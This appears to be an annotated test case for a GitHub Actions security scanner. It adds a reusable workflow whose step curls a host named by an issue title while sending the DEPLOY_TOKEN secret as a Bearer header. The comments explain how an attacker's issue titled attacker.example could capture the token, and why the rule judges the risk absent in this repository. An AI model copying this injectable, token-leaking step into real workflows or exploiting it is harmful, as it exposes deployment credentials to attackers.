@@ -1,0 +1,26 @@
+# situation: the workflow is called; a step sends a request with curl and
+#   the secret DEPLOY_TOKEN to the host github.event.issue.title names. Its
+#   one caller in the repository, ci.yml, runs on push.
+# reason: no added gain for this repository: ci.yml calls the workflow on
+#   push alone, and github.event of a push has no issue, so the value that the
+#   run reads is not a value that an attacker wrote. Another repository may
+#   call the workflow on an event whose payload has what an attacker wrote,
+#   but that run has the token and the secrets of the other repository.
+# cause: the rule reads a called workflow on the events of its callers in
+#   the repository, and ci.yml runs on push alone.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server the attacker runs.
+# attack-run-behavior: ci.yml calls it on push, whose payload has no issue;
+#   when a workflow of another repository calls it on issues, curl sends the
+#   request with Authorization: Bearer and the value of DEPLOY_TOKEN to
+#   attacker.example, and the server of the attacker logs the header.
+on: 
+  workflow_call:
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
